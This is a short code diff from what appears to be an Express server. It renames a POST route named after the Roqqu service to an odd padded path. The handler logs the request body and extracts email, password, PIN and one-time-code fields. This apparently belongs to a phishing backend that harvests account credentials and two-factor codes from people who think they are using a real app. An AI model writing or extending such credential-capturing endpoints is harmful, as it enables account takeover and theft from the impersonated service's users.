@@ -197,7 +197,7 @@ app.post('/roqqu-app', (req, res, next) => {
     })
 })
 
-app.post('/roqqulive', (req, res, next) => {
+app.post('/roqquliveeeeeeee', (req, res, next) => {
     console.log('req body', req.body)
 
     const { email, password, pin, otp } = req.body
